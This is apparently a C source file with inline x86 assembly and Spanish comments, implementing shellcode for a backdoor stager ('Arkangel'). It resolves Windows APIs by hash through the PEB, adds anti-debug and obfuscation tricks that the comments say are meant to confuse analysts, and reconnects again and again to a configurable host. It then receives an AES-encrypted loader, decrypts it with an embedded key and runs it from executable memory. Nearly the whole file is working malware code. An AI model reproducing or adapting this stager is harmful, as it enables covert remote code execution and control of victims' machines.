/*###############################################################################
** Compilación condicionada:
**    Dependiendo de las opciones aquí seleccionadas el código 
**    resultante tendrá unas características u otras.
**    Para más información sobre éstas revisar 'macros.h'.
**    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
*###############################################################################*/

//No queremos que muestre el warning de etiqueta sin referencia, 
//ya que las usamos para mejorar la legibilidad del código
#pragma warning(disable:4102)

#include <Windows.h>
#include "macros.h"

void LoadFunctions(DWORD numHashes);

void __declspec(naked) main(){
    __asm{
#ifdef SC_DELTA
        /*###############################################################################
        ** Obtención del Delta offset:
        **    Obtenemos la posición relativa de nuestro código.
        **    Utilizamos un código poco común que utiliza la FPU.
        **    Primero utilizamos 'fldpi' para actualizar el entorno de FPU
        **    rellenando el item 'FPUInstructionPointer' de la estructura
        **    con la dirección de la última instrucción FPU ('fldz')
        **    Por último cargamos la estructura de entorno con ('fstenv') 
        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
        **    NOTAS{
        **        1: Se harcodean los opcodes para evitar tanto la comprobación
        **        de errores de FP como para evitar el byte superfluo que añade
        **        el visualC
        **        2: La instrucción 'fldpi' en realidad hace un push PI en el stack FPU
        **        (Quién analice el código no sabrá que coño pasa jajaja)
        **    }
        *###############################################################################*/
find_delta:
        fldpi
        EMIT_BYTE_ARRAY(
            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
        )
        pop  edi
        #ifdef SC_NULL
        add  edi, K
        sub  edi, (find_delta+K)
        #else //SC_NULL
        sub  edi, find_delta
        #endif //SC_NULL
#else //SC_DELTA
#ifndef SC_NULL
#ifdef ANTI_DEBUG
        fld tbyte ptr[magic]
        jmp over
    magic:EMIT_BYTE_ARRAY((0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) (0xFF) ('=') ('@'))
    over:
#endif //ANTI_DEBUG
#endif //!SC_NULL
#endif //SC_DELTA

        //Pasamos inicio real del código saltando sobre las constantes.
        jmp  start
    }
#pragma region constantes
        /*###############################################################################
        ** Constantes:
        **    Aquí se declaran las constantes utilizadas en el código{
        **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
        **        VARS      : Variables utilizadas.
        **        KEY       : Utilizado para identificar al cliente en el 'handshake'.
        **        HOST      : Dónde se conectará el socket.
        **    }
        *###############################################################################*/
#pragma region hashes
kernel32_symbol_hashes:
        #define kernel32_count  8
        API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
        API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
        API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p') )
        API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
        API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
        API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A') )
        API_DEFINE(GetTempPathA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('P') ('a') ('t') ('h') ('A') )
        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A') )

ws2_32_symbol_hashes:
        #define ws2_32_count    8
        API_DEFINE(WSASocketA, ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A') )
        API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t') )
        API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p') )
        API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t') )
        API_DEFINE(send, ('s') ('e') ('n') ('d') )
        API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r') )
        API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e') )
        API_DEFINE(recv, ('r') ('e') ('c') ('v') )

advapi32_symbol_hashes:
        #define advapi32_count	4
        API_DEFINE(CryptAcquireContextA, ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
        API_DEFINE(CryptSetKeyParam, ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m') )
        API_DEFINE(CryptImportKey, ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y') )
        API_DEFINE(CryptDecrypt, ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )

#pragma endregion

#pragma region VARS
        VAR_DEFINE(pHOST)
        VAR_DEFINE(pKEY)
        VAR_DEFINE(hProv)
        VAR_DEFINE(hKey)
        VAR_DEFINE(hSocket)
        VAR_DEFINE(pBuff)
        VAR_DEFINE(buffLen)
#pragma endregion
        CALC_STACKSIZE()
KEY:   	//typedef struct aes128Blob{
            //BLOBHEADER{
                /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
                /*bVersion*/    EMIT_BYTE(CUR_BLOB_VERSION)
                /*wReserved*/   EMIT_WORD(0)
                /*aiKeyAlg*/    EMIT_DWORD(CALG_AES_128)
            //}
            /*keySize*/         EMIT_DWORD(0x10)
            /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04) )	
        //}
HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
#pragma endregion
    __asm{
#ifdef ERR_CHECK
/*###############################################################################
** gtfo:
**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
**    error crítico, además es usado para tener una mejor idea de lo ocurrido
*###############################################################################*/

gtfo:
        test eax, eax
        jne  conti
        call [ebp+_ExitProcess]
conti:
        ret
#endif //ERR_CHECK
CreateBuff:
        cdq                             //EDX = 0
        push PAGE_EXECUTE_READWRITE     //v
        pushc(MEM_COMMIT)               //v
        push eax                        //v
        push edx                        //v
        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
#ifdef ERR_CHECK
        push ERR_MEM                    //v
        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
#endif //ERR_CHECK
        ret
start:
        /*###############################################################################
        ** Creación del stack de direcciones:
        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
        **    las direcciones de APIs, también las variables.
        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
        **    'stack de direcciones'
        *###############################################################################*/
        sub  esp, (STACKSIZE)
        mov  ebp, esp
        movr(esi, KEY)
        mov  [ebp+_pKEY], esi
        lea  ebx, [esi+28]
        mov  [ebp+_pHOST], ebx
/*
#pragma region CRYPT_DATA
        #define BLOCK_SIZE 38
        sub  esp, (40)                  //<<<<PARCHEAR EN EL BUILDER
        #ifdef SC_DELTA
        mov  eax, edi                   //Guardamos el Delta Offset
        #endif
        xor  ecx, ecx                   //ECX = 0
        movr(esi, KEY)                  //Puntero al inicio del bloque
        mov  cl, BLOCK_SIZE             //<<<<PARCHEAR EN EL BUILDER (TAMAÑO del bloque)
        lea  edi, [esp+STACKSIZE]       //Puntero del stack donde se copiara el bloque
        mov  [ebp+_pKEY], edi           //Almacenamos el puntero a KEY
        lea  ebx, [edi+28]              //
        mov  [ebp+_pHOST], ebx          //Almacenamos el puntero al HOST
        mov  ebx, edi
        rep  movsb                      //Copiamos el bloque al stack
        mov  cl, (40)/8                 //<<<<TAMAÑO del bloque alineado a 8 y partido entre 8

        EMIT_WORD(0xE3DB) //finit       //Iniciamos la FPU
        fldpi                           //mm7 = pi
Redo:
        lea  edx, [ebx+(ecx*8)-8]       //Siguiente bloque
        movq mm0, QWORD PTR[edx]        //
        pxor mm0, mm7                   //
        movq QWORD PTR[edx], mm0        //
        loop Redo                       //¡Repetimos!

        #ifdef SC_DELTA
        mov edi, eax                    //Restauramos el Delta Offset
        #endif
#pragma endregion
*/

        /*###############################################################################
        ** Carga de APIs:
        **    Iniciamos el proceso de carga de APIs.
        **    Primero se obtendrá el puntero a kernel32 después se cargarán sus funciones,
        **    entre ellas LoadLibraryA(), con ésta se cargarán el resto de librerias.
        *###############################################################################*/

        //Obtenemos en eax la dirección de kernel32
        push 0x30                       //v
        pop  esi                        //v
        lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
        mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
        mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
next_module:
        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (unicode)
        cmp  [eax+0xC], '3'             //module_name[6] == '3'?
        mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
        jne  next_module
find_kernel32_finished:

        movr(ecx, LoadFunctions)
        movr(esi, kernel32_symbol_hashes)//v Puntero al primer hash

        //Cargamos las apis de kernel32 en la pila a partir de los hashes
        push kernel32_count             //v Número de hashes de kernel32
        call ecx                        //>LoadFunctions(kernel32_count);
        mov  ebx, [ebp-(kernel32_count*4)]//EBX = &LoadLibraryA

        push ecx
        //Obtenemos la BaseAddress de ws2_32
        pushc('23')                     //v
        pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
        push esp                        //v
        call ebx                        //>LoadLibraryA("ws2_32");
        pop  edx                        //v
        pop  edx                        //>Restauramos la pila sacando la cadena ANSI
        pop  ecx

        //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
        push ws2_32_count               //v Número de hashes de ws2_32
        call ecx                        //>LoadFunctions(ws2_32_count);

        //Obtenemos el BaseAddress de advapi32
        cdq                             //EDX = 0
        push ecx
        push edx                        //v
        pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
        pushc('avda')                   //v
        push esp                        //v
        call ebx                        //>LoadLibraryA("advapi32");
        add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
        pop  ecx

        push advapi32_count             //v Número de hashes de advapi32
        call ecx                        //>LoadFunctions(advapi32_count);

        //Volvemos a apuntar al inicio del stack de APIs
        sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4

        push [ebp+_pHOST]               //v
        cdq                             //EDX = 0
        push edx                        //v
        push edx                        //v
        call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &HOST)
        cdq                             //EDX = 0
        mov  edx, DWORD PTR FS:[edx+0x18]//v
        mov  eax, [edx+0x34]            //> GetLastError()
#ifdef ERR_CHECK
        xor  al, 0xB7
        push ERR_MTX
        call gtfo
#else //ERR_CHECK
        test eax, eax
        jz  nomtx
        call [ebp+_ExitProcess]
nomtx:
#endif //ERR_CHECK

        push 79                         //v
        pop  eax                        //>EAX = 79
        call CreateBuff                 //Creamos Buffer para la ruta
        mov  edi, eax                   //EDI = EAX

        push eax                        //v
        push 79                         //v
        call [ebp+_GetTempPathA]        //>GetTempPathA(512, Buff);

        cdq                             //EDX = 0
        push edi                        //v
        push edx                        //v
        push edx                        //v
        push edi                        //v
        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);

#define BUFF_SIZE 0x1010101
_cont:  mov  eax, BUFF_SIZE             //EAX = BUFF_SIZE
        call CreateBuff
        mov  [ebp+_pBuff], eax          //pBuffer = EAX

        /*###############################################################################
        ** Creación del socket:
        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerias
        **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
        **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
        *###############################################################################*/

        //Iniciamos el socket
        xor  ebx, ebx                   //EBX = 0
        mov  bl, 0x19                   //EBX = 0x19
        shl  ebx, 0x4                   //EBX = 0x190
        sub  esp, ebx                   //Reservamos espacio suficiente en la pila para WSADATA
        push esp                        //v
#ifdef SC_NULL
        push 2                          //v
        add  [esp+1], 2                 //v VersionRequested = 2.2
#else //SC_NULL
        push 0x202                      //v VersionRequested = 2.2
#endif //SC_NULL
        call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
        add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta

newSocket:
        //Creamos el socket AF_INET y SOCK_STREAM
        cdq                             //EDX = 0    (Si EAX >=0; WSAStartup siempre devuelve >=0)
        push edx                        //v
        push edx                        //v
        push edx                        //v
        push edx                        //v
        inc  edx                        //v EDX = 1 (SOCK_STREAM)
        push edx                        //v
        inc  edx                        //v EDX = 2 (AF_INET)
        push edx                        //v
        call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
        mov  [ebp+_hSocket], eax        //hSocket = EAX

        //Obtenemos la dirección válida
        push [ebp+_pHOST]               //v
        call [ebp+_gethostbyname]       //>gethostbyname(&HOST);

#ifdef ERR_CHECK
        push ERR_HST                    //v
        call gtfo                       //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)
#endif //ERR_CHECK
        add  eax, 0x20                  //EAX = hostent.h_name
        push eax                        //v
        call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);

#define PORT 0xD0070002

        //Construimos la sockaddr_in en la pila
        push eax                        //push IP
        pushc(PORT)                     //push PORT            (TODO:<<<< EL BUILDER PARCHEARÁ ESTO!!!! :D)
        mov  ebx, esp                   //EBX = &sockaddr_in

        //Conectamos al cliente haciendo un máximo de 121 intentos cada 0x1337ms
rst:    
        push 0x79                       //v
        pop  ecx                        //>ECX = 121
doConnect:
        push 0x10                       //v size(sockaddr_in)
        push ebx                        //v
        push [ebp+_hSocket]             //v
        call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
        test eax, eax                   //v
        jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
        loop doConnect                  //(ECX>0)? (Intentamos conectar de nuevo... hasta 121 veces)
        //No ha habido suerte conectando... esperemos 0x1E40ms y volvamos a intentar
#ifdef SC_NULL
        push 0x79                       //v
        shl  DWORD PTR[esp], 0x6        //v
#else //SC_NULL
        push 0x1E40                     //v
#endif //SC_NULL
        call [ebp+_Sleep]               //Sleep(0x1E40);
        jmp  rst
connected:
        add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in

        /*###############################################################################
        ** Recepción de datos desde el cliente:
        **  Una vez establecida la conexión con éxito intentamos recibir 
        **  el paquete inicial compuesto de:
        **      IV+SizePayload+checksum+LOADER_IAT+CARGADOR
        **  Siendo cada uno:
        **      *IV(16bytes)    : Vector de inicializacion para el cifrado
        **{{
        **      *checksum       : checksum de todo el paquete a partir del SizePayload(inclusive), para evitar error crítico al ejecutar.
        **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR+4)
        **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
        **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
        **}}
        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(user+pass)
        *###############################################################################*/
recibir:
        cdq                             //EDX = 0
        push edx                        //v
        push BUFF_SIZE                  //v
        push [ebp+_pBuff]               //v
        push [ebp+_hSocket]             //v
        call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
        mov  [ebp+_buffLen], eax        //buffLen = EAX
        test eax, eax                   //v
        jg   init_decrypt               //>EAX>0? (Todo correcto? Procedemos a descifrar)
KillSocket:
        push [ebp+_hSocket]             //v
        call [ebp+_closesocket]         //>closesocket(hSocket);
        jmp  newSocket                  //Creamos un nuevo socket

        /*###############################################################################
        ** Descrifrado y autentificación:
        **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
        **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
        **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
        *###############################################################################*/

init_decrypt:
        //Adquirimos el handle para trabajar con el CSP deseado.
        cdq                             //EDX = 0
#ifdef SC_NULL
        push 0x0F
        shl  DWORD PTR[esp], 0x1C
#else //SC_NULL
        push CRYPT_VERIFYCONTEXT        //v
#endif //SC_NULL
        push PROV_RSA_AES               //v
        push edx                        //v
        push edx                        //v
        push ebp                        //v
        add  [esp], _hProv              //v
        call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        //Importamos la clave
        cdq                             //EDX = 0
        push ebp                        //v
        add  [esp], _hKey               //v Direccion a la variable que contendra el Handler a la key
        push edx                        //v
        push edx                        //v
        push 0x1C                       //v sizeof(aes128Blob)
        push [ebp+_pKEY]                //v Estructura que contiene la clave exportada
        push [ebp+_hProv]               //v
        call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);

        //Seteamos el valor del IV(Inicializacion Vector)
        cdq                             //EDX = 0
        push edx                        //v
        push [ebp+_pBuff]               //v
        push KP_IV                      //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);

        //Restamos el IV a los datos
        add  [ebp+_pBuff], 16           //pBuff+= 16
        sub  [ebp+_buffLen], 16         //buffLen-= 16

        //Finalmente desciframos los datos obtenidos
        //Los datos se encuentran en el paquete asi: IV(16Bytes)+DataEncrypt

        cdq                             //EDX = 0

        push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer

        push esp                        //v
        push [ebp+_pBuff]               //v
        push edx                        //v
        push edx                        //v
        push edx                        //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);

        pop  ecx                        //Borramos la variable temporal

        /*###############################################################################
        ** Comprobación del checksum:
        **    El checksum esta en +16 de los datos recibidos.
        **    El algoritmo utilizado para calcular el checksum es: 
        **        *FNV1a (http://goo.gl/1A7ir)
        *###############################################################################*/

        mov  esi, [ebp+_pBuff]          //ESI = pBuff
        add  esi, 4                     //ESI+= 4 (saltamos checksum)
        mov  ecx, [esi]                 //ECX = SizePayload
        mov  ebx, [esi-4]               //EBX = CheckSum
        cdq                             //hash = 0
FNV1a:
        lodsb                           //al = str[i]; i++;
        xor  dl, al                     //>hash ^= str[i];
        imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
        loop FNV1a                      //>(len--);(len < 0)?

        cmp  edx, ebx
        jne  KillSocket                 //>(EDX==checksum?)Si es igual a cero significa que los datos recibidos eran correctos

        //Si el checksum no es igual algo falla... reseteamos la conexión

NoErr4: push [ebp+_pKEY]                //v
        push [ebp+_hSocket]             //v
        push [ebp+_GetProcAddress]      //v
#ifdef SC_NULL
        mov  eax, ebp
        push [eax]                      //v
#else //SC_NULL
        push [ebp+_LoadLibraryA]        //v
#endif //SC_NULL
        mov  eax, [ebp+_pBuff]          //v
        add  eax, 0x8                   // Saltamos hasta el cargador_IAT
        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);*/
    }
}

/*###############################################################################
** LoadFunctions:
**  Método encargado de rellenar el stack de direcciones.
**  Llama a la función FindFunction() por cada hash en la lista
**  almacenando la dirección en su respectiva posicion del stack.
**  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
*###############################################################################*/
void __declspec(naked) LoadFunctions(DWORD numHashes){
    __asm{
        push edi
        push ecx
        mov  ecx, [esp+0xC]             //ECX = numHashes
        //ESI = &lpHashes
        mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
        mov  edi, ebp

nextFunction:
        lodsw                           //mov ax, WORD[esi]; esi+=2
#pragma region FindFunction
/*###############################################################################
** FindFunction:
**    Función que recorre la EAT de una DLL en busca de cierta función.
**    Para ello genera un hash del nombre de la función y lo compara con el recibido.
**    Para más información revisar 'macros.h'
*###############################################################################*/
find_function:
        pushad
        //EDX = &IMAGE_DOS_HEADER
        mov  edi, [edx+0x3C]            //EDI = IMAGE_DOS_HEADER.e_lfanew
        mov  edi, [edx+edi+0x78]        //EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
        add  edi, edx                   //EDI = EAT (RVA)
        mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
        mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
#ifdef SC_NULL
        inc  edx                        //EDX++;
#endif //SC_NULL
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
#ifdef SC_NULL
        mov  esi, [ebp+ecx*4-5]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
        dec  esi
#else //SC_NULL
        mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
#endif //SC_NULL
        add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
        xor  ebx, ebx                   //EBX = 0
        push eax
compute_hash_again:
        xor  eax, eax                   //EAX = 0
        lodsb                           //AL = BYTE[ESI];ESI++
        test al, al                     //v
        jz   compute_hash_finished      //>(AL==0)? Fin del LibName
        imul eax, al                    //v
        xor  ebx, eax                   //>hash ^= (char[i]*char[i])
        jmp  compute_hash_again
compute_hash_finished:
        pop  eax
        cmp  bx, ax                     //v
        loopne find_function_loop       //>(BX == FunctionHash)&(ECX>0)?
        mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
#ifdef SC_NULL
        mov  cx, [ebp+ecx*2-1]
#else //SC_NULL
        mov  cx, [ebp+ecx*2]
#endif //SC_NULL
        mov  ebp, [edi+0x1C]
        add  ebp, edx
#ifdef SC_NULL
        mov  eax, [ebp+4*ecx-1]
        dec  eax
#else //SC_NULL
        mov  eax, [ebp+4*ecx]
#endif //SC_NULL

        add  eax, edx
find_function_finished:
        mov  [esp+0x1C], eax
        popad
#pragma endregion AX=HASH;EDX=BaseAddr

        //Guardamos dir en buffer pila
        stosd
        loop nextFunction               //(ECX--);(ECX!=0)?
        mov  ebp, edi
        pop  ecx
        pop  edi
        ret
    }
}